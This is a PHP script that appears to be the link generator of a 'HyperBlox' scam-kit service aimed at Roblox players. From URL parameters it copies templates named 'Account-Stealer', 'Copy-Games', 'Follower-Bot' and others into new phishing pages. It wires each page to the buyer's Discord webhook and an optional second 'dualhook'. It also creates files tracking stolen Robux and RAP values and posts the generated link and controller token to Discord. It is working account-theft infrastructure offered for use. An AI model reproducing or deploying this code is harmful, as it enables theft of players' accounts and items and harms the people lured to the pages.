<?php
function token($length = 32) {
    $base = 'HYPERBLOX';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomPart = '';
    
    for ($i = 0; $i < $length - strlen($base); $i++) {
        $randomPart .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    $mixed = str_shuffle($base . $randomPart);
    return substr($mixed, 0, $length);
}

$dir = $_GET['dir'];
$web = $_GET['web'];
$t = $_GET['t'];

if (preg_match('/[^A-Za-z0-9]/', $dir)) {
    $error = "Directory can only contain letters and numbers!";
}

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $web);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPGET, true);
$req = curl_exec($curl);
$jd = json_decode($req, true);
$err = $jd['guild_id'];

if ($err == "") {
    $error = "Invalid Webhook";
}

if ($t == "as") {
    $fol = "Account-Stealer";
}
if ($t == "cc") {
    $fol = "Copy-Clothes";
}
if ($t == "gc") {
    $fol = "Copy-Games";
}
if ($t == "fb") {
    $fol = "Follower-Bot";
}
if ($t == "vu") {
    $fol = "Vc-Unlocker";
}
if ($t == "mr") {
    $fol = "Mass-Reporter";
}

if ($error == "") {
    if (!file_exists("../../$dir")) {
        mkdir("../../$dir");
        $index = file_get_contents("../../$fol/index.php");
        if ($t == "dg") {
            $index = file_get_contents("indexdh.php");
        }
        $index = str_replace("{web}", $web, $index);
        $index = str_replace("{dualhook}", $_GET['dualhook'], $index);
        $token = token();
        $tw = "$dir | $web";
        $path = "../../$dir/";
        $path2 = "tokens/";

        if (!file_exists($path2)) {
            mkdir($path2, 0777, true);
        }

        file_put_contents($path2 . "nuthooks.txt", trim($web) . PHP_EOL, FILE_APPEND | LOCK_EX);

        $fo = fopen($path . "index.php", 'w');
        $visit = fopen($path . "visits.txt", 'w');
        $logs = fopen($path . "logs.txt", 'w');
        $usernameFile = fopen($path . "username.txt", 'w');
        $logoFile = fopen($path . "logo.txt", 'w');
        $robuxFile = fopen($path . "robux.txt", 'w');
        $rapFile = fopen($path . "rap.txt", 'w');
        $summaryFile = fopen($path . "summary.txt", 'w');
        $dailyRobuxFile = fopen($path . "dailyrobux.txt", 'w');
        $dailyRapFile = fopen($path . "dailyrap.txt", 'w');
        $dailySummaryFile = fopen($path . "dailysummary.txt", 'w');
        $fo2 = fopen($path2 . "$token.txt", 'w');

        if ($fo) {
            fwrite($fo, $index);
            fwrite($fo2, "$token | $dir | $web\n");
            fwrite($visit, '');
            fwrite($logs, '');
            fwrite($usernameFile, 'beammer');
            fwrite($logoFile, 'https://hyperblox.eu/files/img.png');
            fwrite($robuxFile, '0');
            fwrite($rapFile, '0');
            fwrite($summaryFile, '0');
            fwrite($dailyRobuxFile, json_encode(array_fill(0, 7, 0)));
            fwrite($dailyRapFile, json_encode(array_fill(0, 7, 0)));
            fwrite($dailySummaryFile, json_encode(array_fill(0, 7, 0)));

            $dom = $_SERVER['SERVER_NAME'];
            $timestamp = date("c");
            $hyperbloxIcon = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';

            if ($t == "dg") {
                $json_data = json_encode([
                    "content" => "@everyone",
                    "username" => "HyperBlox",
                    "avatar_url" => $hyperbloxIcon,
                    "embeds" => [
                        [
                            "title" => "💠 Successfully Created!",
                            "description" => "**<:link:1392952591297675315> [Dualhook Link](https://$dom/$dir) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
                            "color" => hexdec("00BFFF"),
                            "fields" => [
                                [
                                    "name" => "<:link:1392952591297675315> Dualhook Link",
                                    "value" => "```https://$dom/$dir```",
                                    "inline" => false
                                ]
                            ],
                        ]
                    ]
                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
            } else {
                $json_data = json_encode([
                    "content" => "@everyone",
                    "username" => "HyperBlox",
                    "avatar_url" => $hyperbloxIcon,
                    "embeds" => [
                        [
                            "title" => "💠 Successfully Created!",
                            "description" => "**<:link:1392952591297675315> [Generated Link](https://$dom/$dir) <:line:1350104634982662164> <:settings:1392952588093100265> [Controller](https://$dom/controlPage/sign-in.php?token=$token) <:line:1350104634982662164> <:discord:1392952595718344855> [Discord Server](https://discord.gg/pcT4DurrDH)**",
                            "color" => hexdec("00BFFF"),
                            "fields" => [
                                [
                                    "name" => "**<:link:1392952591297675315> Link**",
                                    "value" => "```https://$dom/$dir```",
                                    "inline" => false
                                ],
                                [
                                    "name" => "**<:settings:1392952588093100265> Controller**",
                                    "value" => "```https://$dom/controlPage/sign-in.php?token=$token```",
                                    "inline" => false
                                ],
                                [
                                    "name" => "**<:token:1392953422067662898> Token**",
                                    "value" => "```$token```",
                                    "inline" => false
                                ]
                            ],
                        ]
                    ]
                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
            }

            $ch = curl_init($web);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $response = curl_exec($ch);
            curl_close($ch);
        }
    } else {
        echo "Directory Taken";
    }
} else {
    echo $error;
}
?>